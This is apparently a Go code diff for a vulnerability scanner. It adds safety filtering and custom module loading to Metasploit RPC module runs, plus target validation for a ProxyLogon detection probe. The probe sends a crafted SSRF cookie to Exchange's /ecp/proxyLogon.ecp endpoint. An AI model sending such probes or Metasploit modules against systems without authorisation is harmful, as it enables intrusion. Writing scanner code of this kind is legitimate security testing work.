+				if mod.LessSafe && !allowLessSafe {
+					continue
+				}
+				modules = append(modules, struct {
+					name    string
+					options map[string]string
+					title   string
+					cve     string
+				}{
+					name:    mod.Name,
+					options: mod.Options,
+					title:   mod.Title,
+					cve:     mod.CVE,
+				})
+				customLoaded++
+			}
+		}
 	}
 
 	findings := make([]model.Finding, 0)
@@ -959,8 +1696,11 @@ func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password
 	// Always logout to clean up the RPC session.
 	_ = msfLogout(ctx, client, rpcURL, token)
 
-	note := fmt.Sprintf("msfrpc: ran %d modules against %s:%s", ranModules, rhost, rport)
-	return findings, note
+	moduleExecutionNote := fmt.Sprintf("msfrpc: ran %d modules against %s:%s (less_safe=%t custom_loaded=%d)", ranModules, rhost, rport, allowLessSafe, customLoaded)
+	if customLoadErr != "" {
+		moduleExecutionNote += " template_error=" + customLoadErr
+	}
+	return findings, moduleExecutionNote
 }
 
 // msfAuth authenticates to msfrpcd and returns a session token.
@@ -1439,16 +2179,30 @@ func probeThinkPHPRCE(ctx context.Context, client *http.Client, target string, p
 // X-OWA-Version response header which is unique to Exchange, and probe the
 // known SSRF endpoint with a crafted cookie to detect the vulnerability.
 func probeExchangeProxyLogon(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+
 	// Step 1: fingerprint — look for Exchange-specific headers/body content.
 	fingerprintPaths := []string{
 		"/owa/", "/ews/exchange.asmx", "/autodiscover/autodiscover.xml",
 		"/Microsoft-Server-ActiveSync",
 	}
 
-	base := strings.TrimRight(target, "/")
 	isExchange := false
 	for _, fp := range fingerprintPaths {
-		req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+fp, nil)
+		probeURL := base + fp
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
 		if err != nil {
 			continue
 		}
@@ -1486,6 +2240,9 @@ func probeExchangeProxyLogon(ctx context.Context, client *http.Client, target st
 	// X-AnonResource-Backend cookie. A vulnerable server will issue an
 	// SSRF request and may return an Exchange-specific error or redirect.
 	ssrfURL := base + "/ecp/proxyLogon.ecp"
+	if err := validateMetasploitProbeTarget(ssrfURL); err != nil {
+		return nil
+	}
 	ssrfCookie := "X-AnonResource=true; X-AnonResource-Backend=localhost/ecp/default.flt?~3;" +
 		" X-BEResource=localhost/owa/auth/logon.aspx?~3;"
 
